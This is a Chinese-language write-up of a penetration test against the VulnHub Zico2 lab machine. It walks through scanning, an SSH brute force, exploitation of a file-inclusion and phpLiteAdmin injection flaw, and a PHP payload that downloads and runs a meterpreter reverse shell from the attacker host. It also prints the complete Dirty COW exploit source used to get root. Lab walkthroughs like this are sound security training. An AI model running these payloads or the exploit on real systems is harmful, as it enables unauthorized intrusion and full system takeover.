# Zico2渗透实战

## 下载地址

```
http://www.vulnhub.com/entry/zico2-1,210/
```

## **主机发现**

```
sudo netdiscover -i eth0 -r 192.168.100.0/24
```

## 目标主机IP：192.168.100.153

![image-20210921110027693](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211100466.png)

## **端口扫描**

    sudo nmap -A 192.168.100.153

![image-20210920211815892](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109202118390.png)

## 指纹识别

```
whatweb 192.168.100.153
```

![image-20210920211850129](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109202118388.png)

## 目录扫描

```
dirsearch  -u http://192.168.100.153
```

![image-20210920212423445](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109202124732.png)

## ssh弱密码扫描

```sh
hydra -L top500.txt -P top6000.txt  192.168.100.153  ssh  
```

![image-20210920212846097](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109202128260.png)

## nitko

```
sudo nikto -h 192.168.100.153 
```

![image-20210920213013806](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109202130968.png)



## 访问目标靶机的80端口,**寻找有价值的信息；**

>  http://192.168.100.153/view.php?page=tools.html

> 看到链接后面有？page= tools.html，猜想：是否该页面包含文件包含漏洞；

##  **尝试文件包含漏洞**

```
http://192.168.100.153/view.php?page=/etc/passwd
http://192.168.100.153/view.php?page=../etc/passwd
http://192.168.100.153/view.php?page=../../etc/passwd
```

![image-20210921111131326](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211111606.png)

## 由扫描到的网站目录进入/dbadmin/

```
http://192.168.100.153/dbadmin/test_db.php
```

![image-20210921111448815](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211114086.png)

## 查询对应版本的漏洞；

```
searchsploit phpLiteAdmin
```


![image-20210920213034018](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109202130182.png)

## 存在PHP 远程代码注入漏洞；

## 尝试使用弱口令进行登录数据库

>  admin 成功登录，

![image-20210921111744857](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211117146.png)

## 查看敏感的信息users表中info

```
http://192.168.100.153/dbadmin/test_db.php?action=row_view&table=info
```

![image-20210921112005691](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211120939.png)

> md5解密后成功获取两个账户：

- root   34kroot34
-  zico   zico2215@

## 尝试使用ssh登录

````
ssh root@192.168.100.153 
````

> - 两个账户都登录失败；

## 命令注入漏洞和文件包含漏洞的利用

> **原理**:**创建的数据库中表的内容的值可以通过文件包含解析成php**



创建一个数据库：xiao；创建一个表：xiu，1个字段信息；

![image-20210921113155682](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211131928.png)



![image-20210921113243593](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211132776.png)

## value写成phpinfo

```
'<?php phpinfo();?>'
```

![image-20210921113619439](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211136651.png)

## 通过文件包含访问数据库文件xiao

```
http://192.168.100.153/view.php?page=../../usr/databases/xiao
```

![image-20210921113831229](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211138573.png)

## **同理在网站数据库中上传脚本文件获取目标靶机的shell**

创建一个数据库：shell；创建一个表：xiu，1个字段信息；

- msfvenom生成木马

```
sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -i 10 -f elf -o  /var/www/html/xiao3
```

**linux.rc文件**

```sh
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.143
set LPORT 4444
exploit
```

- 开启监听

```sh
msfconsole  -qr /home/xiaoxiaoran/shell/linux.rc  
```

## 注入的value为

```php
<?php system("wget 192.168.100.143/xiao3 -O /tmp/xiao3;cd /tmp;chmod +x xiao3;./xiao3 &")?>
```

![image-20210921120422331](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211204523.png)

## 访问执行

```url
http://192.168.100.153/view.php?page=../../usr/databases/shell
```

![image-20210921120841669](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211208907.png)

![image-20210921120910207](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211209494.png)

## 拿到shell,开始提权,脏牛提权

- dirty.c文件

```c
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo
{
  char *username;
  char *hash;
  int user_id;
  int group_id;
  char *info;
  char *home_dir;
  char *shell;
};

char *generate_password_hash(char *plaintext_pw)
{
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u)
{
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
                      u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
          u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg)
{
  int i, c = 0;
  for (i = 0; i < 200000000; i++)
  {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to)
{
  // check if target file already exists
  if (access(to, F_OK) != -1)
  {
    printf("File %s already exists! Please delete it and run again\n",
           to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if (source == NULL)
  {
    return -1;
  }
  target = fopen(to, "w");
  if (target == NULL)
  {
    fclose(source);
    return -1;
  }

  while ((ch = fgetc(source)) != EOF)
  {
    fputc(ch, target);
  }

  printf("%s successfully backed up to %s\n",
         from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0)
  {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "firefart";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2)
  {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  }
  else
  {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n", (unsigned long)map);
  pid = fork();
  if (pid)
  {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l = strlen(complete_passwd_line);
    for (i = 0; i < 10000 / l; i++)
    {
      for (o = 0; o < l; o++)
      {
        for (u = 0; u < 10000; u++)
        {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long *)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n", c);
  }
  else
  {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth, NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
         user.username, plaintext_pw);
  printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
         backup_filename, filename);
  return 0;
}
```

- 转换shell

```
meterpreter > shell
```

- 将shell转换为交互式的tty

```
python -c 'import pty;pty.spawn("/bin/bash")'  
```

![image-20210921121423380](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211214614.png)

- 脏牛提权

```
cd /tmp
wget 192.168.100.143/dirty.c
gcc -pthread dirty.c -o exp -lcrypt
./exp xiuxiu
```

![image-20210921122551693](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211225986.png)

## 提权成功

> 密码为xiuxiu ,firefart即为root管理员

![image-20210921123032379](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211230614.png)



## **在zizo的目录下发现了WordPress文件；**

```
cd /home/zico/wordpress
cat wp-config.php
```

![image-20210921123746672](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211237957.png)

![image-20210921123829714](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211238969.png)



> wp-config.php 文件是WordPress数据库的关键。
>
> 数据库名、用户名、密码、位置都是在此设置。

- 获取到用户名：   zico
- 密码：   sWfCsfJSPV9H3AmQzw8

## **利用得到的密码尝试去登录ssh**

```
 ssh zico@192.168.100.153
```

![image-20210921124122185](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109211241366.png)

